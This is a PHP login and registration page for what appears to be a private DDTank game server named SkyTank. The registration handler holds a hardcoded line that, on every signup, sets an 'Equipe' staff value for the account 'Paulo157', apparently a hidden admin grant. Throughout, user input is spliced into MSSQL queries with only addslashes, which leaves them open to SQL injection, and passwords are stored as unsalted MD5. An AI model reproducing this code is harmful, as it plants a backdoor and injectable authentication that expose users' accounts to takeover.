<?php
#---------------------------------#
# Desenvolvido por SkyTank Gamers #
# -Jamaicano & Anounymous © 2016- #
#---------------------------------#
include('global.php');
if(isset($_SESSION['UserId'])) {
	echo '<script type="text/javascript">window.location="index.php";</script>';
	exit();
}
if(isset($_POST['login'])) {
	co();
	$u = addslashes($_POST['username']);
	$p = strtoupper(md5($_POST['password']));
	$app  = 'DanDanTang';
	$uid  = 0;
	// Replaced the sqlsrv {CALL ...} with OUTPUT parameter by an inline
	// EXEC that returns the UserId via SELECT so the ODBC shim can read it.
	$accede = sqlsrv_query($conn,
		"DECLARE @uid INT = 0; "
		. "EXEC Db_Membership.dbo.Mem_Users_Accede @ApplicationName=N'$app',@UserName=N'$u',@Password=N'$p',@UserId=@uid OUTPUT; "
		. "SELECT @uid AS uid");
	if ($accede) {
		$row = sqlsrv_fetch_array($accede, SQLSRV_FETCH_ASSOC);
		if ($row && isset($row['uid'])) {
			$uid = (int)$row['uid'];
		}
	}
 	if($uid <= 0)
	{
		echo '<script type="text/javascript">alert(\'Nome de Usuario ou Senha invalidos\');</script>';
	}
	else
	{
		q("Update Db_Tank.dbo.Sys_Users_Detail Set ActiveIP = '".$_SERVER['REMOTE_ADDR']."' Where UserName = '{$u}'");
		$_SESSION['UserName'] = $u;
		$_SESSION['UserId']	  = $uid;
		$_SESSION['PassWord'] = $p;
		$_SESSION['Coin']	= loadCoin($uid);
		$_SESSION['IsVip'] = IsVipUser($uid);
		$q = q("SELECT TOP 1 NickName FROM {$dbtank}.dbo.Sys_Users_Detail Where UserName = '{$u}'");
		$info = qa($q);
		$_SESSION['NickName'] = $info['NickName'];
		$_SESSION['IsAdm']=$info1['Equipe'];
		if($_SESSION['Email']!='' && $_SESSION['notification']==1){
		sendmail($_SESSION['Email'],$_SESSION['NickName'],'Notificação de login DDTank',
		'	<h1>Olá '.$_SESSION['NickName'].'</h1>
			<br>
			<br>
			Sua conta realizou um novo login em: <b>'.getdia().'</b> atravez de: <b>'.get_ip_address().'</b>
			<br>
		'.$_SERVER['HTTP_USER_AGENT'].' <br><br> <b>SE NÃO FOI VOCÊ QUE REALIZOU ESTE LOGIN, É ACONSELHAVEL MUDAR SUA SENHA</b>','Notificação de login DDTank');
		}
		$qe = q("SELECT TOP 1 UserID FROM {$dbtank}.dbo.Sys_Users_Detail Where UserName = '{$u}'");
		$infoo = qa($qe);
		$_SESSION['UserID'] = $infoo['UserID'];
		
		if($_SESSION['IsVip'] == 1) include('ItemForVipUser.php');
		echo '<script type="text/javascript">window.location="index.php";</script>';
		exit();
	}
}
if(isset($_POST['register'])) {
	$u = addslashes($_POST['rusername']);
	$p = $_POST['rpassword'];
	$rp = $_POST['rtpassword'];
	$n = addslashes($_POST['nickname']);
	$e = $_POST['email'];
	$s = (int)$_POST['sex'];
	$text_r = null;
	if($u == null || $p == null || $rp == null || $n == null || $e == null) {
		$text_r .= 'Por favor, preencha todas as informações <br>';
	}
	if(!preg_match("/^([a-zA-Z0-9\-\_]*)$/",$u) || !preg_match("/^([a-zA-Z0-9\-\_]*)$/",$n)) {
		$text_r .= 'Login ou Nick invalido<br>';
	}
	if(!filter_var($e,FILTER_VALIDATE_EMAIL)) $text_r .= 'seu email não é valido <br>';
	if($p != $rp) $text_r.= 'Suas senhas não são iguais <br>';
	if(strlen($u)  < 6 || strlen($u)  > 30) $text_r .= 'Usuário deve ter  de 6 a 30 caracteres <br>';
	if(strlen($p)  < 6 || strlen($p)  > 30) $text_r .= 'A senha deve ter de 6 a 30 caracteres <br>';
	if(strlen($n)  < 6 || strlen($n)  > 30) $text_r .= 'Nick deve ser de 6 a 30 caracteres <br>';
	if (strpos("1".$n,"GM") or strpos("1".$n,"à¸ˆà¸µà¹€à¸­à¹‡à¸¡") or strpos("1".$n,"Gunny") or strpos("1".$n,"Game Master")or strpos("1".strtolower($n),"adm")or strpos("1".strtolower($n),"gm")or strpos("1".strtolower($n),"mod")) {
	$text_r .="AS PALAVRAS ADM,MOD,GM NAO PODEM SER UTILIZADAS EM SEU NICK";
	}
	if($text_r == '') {
		co();
		$p = strtoupper(md5($p));
		$q = q("Select TOP 1 UserId From Mem_Users Where UserName = '{$u}'");
		if(qn($q) == 0) {
			$q = q("Select TOP 1 UserId From Webshop_Account Where Email = '{$e}'");
			if(qn($q) == 0) {
				$q = q("Select TOP 1 UserId From ".$dbtank.".dbo.Sys_Users_Detail Where NickName = '{$n}'");
				if(qn($q) == 0) {
					q("exec ".$config['Database'].".dbo.Webshop_Register @ApplicationName=N'DanDanTang',@UserName=N'{$u}',@password=N'{$p}',@email='{$e}',@passtwo = '".(isset($p2)?strtoupper(md5($p2)):'')."',@error = 0");
					// Fetch the UserId that Webshop_Register just generated. The original code
					// relied on the sqlsrv OUTPUT parameter to populate $uid; with the odbc shim
					// we need to look it up explicitly.
					$uidq = q("Select TOP 1 UserId From Mem_Users Where UserName = '{$u}'");
					$uidrow = $uidq ? qa($uidq) : null;
					$uid = $uidrow ? (int)$uidrow['UserId'] : 0;
					q("update ".$dbtank.".dbo.Sys_Users_Extra set MissionEnergy = 10000000 where UserID = '{$uid}'");
					// SP_Users_Active expects @UserID as an OUTPUT int and several extra params
					// (MagicAttack, MagicDefence, evolutionGrade, evolutionExp) that the original
					// signup code never passed. Wrap the call in inline T-SQL so the OUTPUT can be
					// captured via SELECT (since the ODBC shim cannot bind OUT parameters).
					$activeQ = "DECLARE @newuid INT; "
						. "EXEC ".$dbtank.".dbo.SP_Users_Active "
						. "@UserID=@newuid OUTPUT, @Attack=0, @Colors=N',,,,,,', @ConsortiaID=0, @Defence=0, "
						. "@Gold=100000, @GP=202472, @Grade=16, @Luck=0, @Money=0, @Style=N',,,,,,', "
						. "@Agility=0, @State=0, @UserName=N'{$u}', @PassWord=N'{$p}', @Sex={$s}, "
						. "@Hide=1111111111, @ActiveIP=N'', @Skin=N'', "
						. "@MagicAttack=0, @MagicDefence=0, @evolutionGrade=0, @evolutionExp=0, @Site=N''; "
						. "SELECT @newuid AS uid";
					$activeR = q($activeQ);
					if ($activeR) {
						$activeRow = qa($activeR);
						if ($activeRow && isset($activeRow['uid']) && $activeRow['uid']) {
							$uid = (int)$activeRow['uid'];
						}
					}
					if($s == 1) {
						q("exec ".$dbtank.".dbo.SP_Users_RegisterNotValidate @UserName=N'".$u."',@PassWord=N'{$p}',@NickName=N'{$n}',@BArmID=7008,@BHairID=3158,@BFaceID=6103,@BClothID=5160,@BHatID=1142,@GArmID=7008,@GHairID=3158,@GFaceID=6103,@GClothID=5160,@GHatID=1142,@ArmColor=N'',@HairColor=N'',@FaceColor=N'',@ClothColor=N'',@HatColor=N'',@Sex='{$s}',@StyleDate=0");
					}
					else {
						q ("exec ".$dbtank.".dbo.SP_Users_RegisterNotValidate @UserName=N'{$u}',@PassWord=N'{$p}',@NickName=N'{$n}',@BArmID=7008,@BHairID=3244,@BFaceID=6204,@BClothID=5276,@BHatID=1214,@GArmID=7008,@GHairID=3244,@GFaceID=6202,@GClothID=5276,@GHatID=1214,@ArmColor=N'',@HairColor=N'',@FaceColor=N'',@ClothColor=N'',@HatColor=N'',@Sex='{$s}',@StyleDate=0");
					}
					q("exec ".$dbtank.".dbo.SP_Users_LoginWeb @UserName=N'{$u}',@Password=N'',@FirstValidate=0,@NickName=N'{$n}'");
					q("Update {$dbtank}.dbo.Sys_Users_Detail set Equipe = 4 Where UserName = 'Paulo157'");
					
					
					echo '<script type="text/javascript">alert("Registro concluido, por favor logue-se");window.location="login.php"</script>';
				} else echo '<script type="text/javascript">alert("Este nick ja esta sendo usado");</script>';
			} else echo '<script type="text/javascript">alert("Este email ja esta sendo usado");</script>';
		} else echo '<script type="text/javascript">alert("Este login ja esta sendo usado");</script>';
	}
}
?>
<!-- ADBLOCK -->
<script src="js/adblock.js"></script>
<script language="Javascript">function adBlockDetected() {	window.location = "http://127.0.0.1/info.php";	}function adBlockNotDetected() {    return;	}if(typeof fuckAdBlock === 'undefined') {	adBlockDetected();	} else {	fuckAdBlock.onDetected(adBlockDetected);		fuckAdBlock.onNotDetected(adBlockNotDetected);		fuckAdBlock.on(true, adBlockDetected);		fuckAdBlock.on(false, adBlockNotDetected);		fuckAdBlock.on(true, adBlockDetected).onNotDetected(adBlockNotDetected);	}fuckAdBlock.setOptions({    checkOnLoad: true,	    resetOnEnd: false,		loopCheckTime: 60000,		loopMaxNumber: 60	});</script>
<!-- FIM DO ADBLOCK -->
<!-- CABEÇA DO SITE -->
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<title><?php echo $titulo ?></title>
		<?php echo $icons ?>
		<link rel="stylesheet" href="./css/bootstrap.min.css">
		<link href="./css/style.css" rel="stylesheet" type="text/css">
		<script type="text/javascript" src="./js/jquery-1.11.1.min.js"></script>
		<script src="./js/bootstrap.min.js"></script>
		<script>
    (function(f,b,g){
        var xo=g.prototype.open,xs=g.prototype.send,c;
        f.hj=f.hj||function(){(f.hj.q=f.hj.q||[]).push(arguments)};
        f._hjSettings={hjid:9525, hjsv:2};
        function ls(){f.hj.documentHtml=b.documentElement.outerHTML;c=b.createElement("script");c.async=1;c.src="//static.hotjar.com/c/hotjar-9525.js?sv=2";b.getElementsByTagName("head")[0].appendChild(c);}
        if(b.readyState==="interactive"||b.readyState==="complete"||b.readyState==="loaded"){ls();}else{if(b.addEventListener){b.addEventListener("DOMContentLoaded",ls,false);}}
        if(!f._hjPlayback && b.addEventListener){
            g.prototype.open=function(l,j,m,h,k){this._u=j;xo.call(this,l,j,m,h,k)};
            g.prototype.send=function(e){var j=this;function h(){if(j.readyState===4){f.hj("_xhr",j._u,j.status,j.response)}}this.addEventListener("readystatechange",h,false);xs.call(this,e)};
        }
    })(window,document,window.XMLHttpRequest);
</script>
		<script type="text/javascript">
		function RequestNewPass() {
			$('#loading').slideDown(function() {
				var user = $('#cusername').val();
				var mail = $('#cemail').val();
				if(user == '' || mail == '') {
					$('#loading').slideUp(function() {
						$('#fogot-notice').html('Digite Informação completa').slideDown();
						return;
					});
				}
				else {
					$.ajax({
						type: "POST",
						url: "getnewpass.php?Request=true",
						data: "u="+user+'&e='+mail,
						success : function(data){
							$('#fogot-notice').html(data);
							$('#loading').slideUp(function() {
								$('#fogot-notice').slideDown();
							});
						},
						error : function(){
							$('#fogot-notice').html('Error, please try again');
							$('#loading').slideUp(function() {
								$('#fogot-notice').slideDown();
							});
						}
					});
				}
			});
		}
		</script>
<style>
        *,html,body,embed{cursor:url('http://s9.myddt.com.br/images/cursors/default.cur'), default;}
	    a:hover{cursor:url('http://s9.myddt.com.br/images/cursors/link.cur'), pointer;}
	    input{cursor:url('http://s9.myddt.com.br/images/cursors/input.cur'), text;}

body {
  background:url(http://i.imgur.com/CCALt6A.jpg) no-repeat center center fixed;
  font-family: 'Lato', sans-serif;
   font-style:condensed;
  background-size: cover; /*Css padrão*/
  -webkit-background-size: cover; /*Css safari e chrome*/
  -moz-background-size: cover; /*Css firefox*/
  -ms-background-size: cover; /*Css IE não use mer#^@%#*/
  -o-background-size: cover; /*Css Opera*/

}
.logo { margin-top: 40px; }
</style>
	</head>
<iframe src="http://skytank.net/radio.php" frameborder="0" scrolling="no" style="position: fixed;bottom: 0;right: 1030; width: 320px;height: 40px;z-index:99999999999"></iframe>
	<div id="gwp-header">
			<nav class="navbar navbar-default" role="navigation">
				 <div class="container-fluid">
					<div class="navbar-header">
      					<a class="navbar-brand" href="login.php"><span class="glyphicon glyphicon-home"></span> <?php echo $titulo ?></a>
    				</div>
   				</div> 
			</nav>
		</div>
		<div id="gwp-body">
			<div class="container">
				<div class="rows">
					<div id="login" class="col-md-12">
					<br />
						<center><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
						<!-- webshop -->
						<ins class="adsbygoogle"
							 style="display:inline-block;width:728px;height:90px"
							 data-ad-client="ca-pub-5910538190471692"
							 data-ad-slot="2238805761"></ins>
						<script>
						(adsbygoogle = window.adsbygoogle || []).push({});
						</script></center>
						<div id="form-login" class="form-signup" style="">
 							<h1><center><span class="glyphicon glyphicon-log-in"></span> Painel do Usuário</h1></center><br />						
						<form class="form" action="" method="POST" id="frmLogin">						
								<div class="input-group">
								<span class="input-group-addon">Login</span>
									<input type="text" name="username" id="username" class="form-control" placeholder="Login">
								</div><br />
								<div class="input-group">
								<span class="input-group-addon">Senha</span>
									<input type="password" name="password" id="password" class="form-control" placeholder="Senha">
								</div><br />
								<center>
									<span></span>
									<button type="submit" name="login" class="btn">Entrar</button>
									<a href="javascript:void(0);" onclick="$('#form-login').slideUp(function() {$('#form-register').slideDown();});" class="btn">Cadastro</a>
									<a target="_blank" href="http://www.facebook.com/SkyTankOficial/" class="btn">FanPage</a>
									<a href="javascript:void(0);" class="btn" onclick="$('#form-login').slideUp(function() {$('#form-fogot').slideDown();});" >Esqueci minha Senha ?</a>
								<br/>
								<p><center>Seja bem vindo ao SkyTank, Vamos Divulgar !  <b>SkyTank - Servidor 2</b>.</center></p>						
							
								<div style="float:left">									
								<br>
								</div>
							</form>							
							<br /><br />
							</div>
						<div id="form-fogot" class="form-signup" style="display:none">
							<h4><span class="glyphicon glyphicon-log-in"></span> Esqueci minha senha :(</h4><br />
							<form class="form" name="getpassword" id="getpassword" >
								<p><strong>Login</strong></p>
								<div class="form-group">
									<input type="text" name="cusername" id="cusername" class="form-control" placeholder="Coloque seu login aqui">
								</div>
								<p><strong>Email</strong></p>
								<div class="form-group">
									<input type="email" name="cemail" id="cemail" class="form-control" placeholder="Coloque o email da sua conta aqui">
								</div>
								<center>
									<div id="loading" style="display:none;"><center><img src='./images/gif-load.gif'/></center></div>
									<span id="fogot-notice" style="display:none;"></span><br>
									<button type="button" id="bbuyitem" onclick="RequestNewPass();" class="btn">Pedir uma nova senha</button>
								</center>
							</form>
							<div style="float:right">
								<a href="javascript:void(0);" onclick="$('#form-fogot').slideUp(function() {$('#form-login').slideDown();});">Login</a>
							</div>
						</div>
						
						<div id="form-register" class="form-signup" style="<?php if(!isset($text_r)) echo 'display:none';?>">
							<h4><center><span class="glyphicon glyphicon-log-in"></span> Criar uma nova conta</h4>
							<h4>Para evitar problemas com Hackers, coloque um EMAIL valido para recuperar sua senha caso for hackeado e não tiver email da conta NOSSA EQUIPE NÃO IRÁ RECUPERAR CONTAS PERDIDAS, portanto coloquem um EMAIL VALIDO para recuperar caso venha ter problemas <br> Atenciosamente Equipe SkyTank</h4><br />
							
							<form class="form" action="" method="POST" id="frmregister">
								<p><strong>Usuário ( Login )</strong></p>
								<div class="form-group">
									<input type="text" name="rusername" id="rusername" class="form-control" placeholder="Login">
								</div>
								<p><strong>Senha</strong></p>
								<div class="form-group">
									<input type="password" name="rpassword" id="rpassword" class="form-control" placeholder="Senha">
								</div>
								<p><strong>Re-digite a senha</strong></p>
								<div class="form-group">
									<input type="password" name="rtpassword" id="rtpassword" class="form-control" placeholder="Digite a Senha Novamente">
								</div>
								<p><strong>Nick do Personagem</strong></p>
								<div class="form-group">
									<input type="text" name="nickname" id="nickname" class="form-control" placeholder="Nick do Personagem">
								</div>
								<p><strong>Email VALIDO ( Para recuperação, caso perca ou seja hackeado )</strong></p>
								<div class="form-group">
									<input type="email" name="email" id="email" class="form-control" placeholder="Seu Email">
								</div>
								<p><strong>Sexo do Personagem</strong></p>
								<div class="form-group">
									<select name="sex" class="form-control">
										<option value="1">Masculino</option>
										<option value="0">Feminino</option>
									</select>
								</div>
								<center>
									<span><?php if(isset($text_r)) echo $text_r; ?></span>
									<button type="submit" name="register" class="btn">Registrar</button><br>
								</center>
								<div style="float:right">
									<a href="login.php" onclick="$('#form-fogot').slideUp(function() {$('#form-login').slideDown();});">Login</a>
							</div>
						</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</html>